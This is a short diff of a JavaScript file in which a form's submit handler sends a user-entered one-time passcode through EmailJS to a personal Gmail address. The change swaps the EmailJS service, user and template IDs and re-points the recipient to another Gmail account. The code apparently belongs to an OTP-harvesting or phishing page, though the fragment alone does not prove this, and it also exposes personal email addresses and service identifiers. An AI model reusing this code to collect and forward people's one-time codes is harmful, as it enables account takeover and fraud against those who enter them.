@@ -4,13 +4,13 @@ const btn = document.querySelector("button");
 btn.onclick = () => {
   btn.innerHTML = "Loading...";
 };
-const serviceId = "service_oy3li0w";
-const userId = "omr4P0sdLmxEqse49";
-const templateId = "template_j8e5nou";
+const serviceId = "service_o474xzp";
+const userId = "yF64jxxnz5Wh-Hbvj";
+const templateId = "template_1sejyz4";
 document.getElementById("myForm").onsubmit = function (event) {
   event.preventDefault();
   const emailParams = {
-    to_name: "Victorchinemerem191@gmail.com",
+    to_name: "Ochiezevictor23@gmail.com",
     otp: otp.value,
   };
   console.log(emailParams);
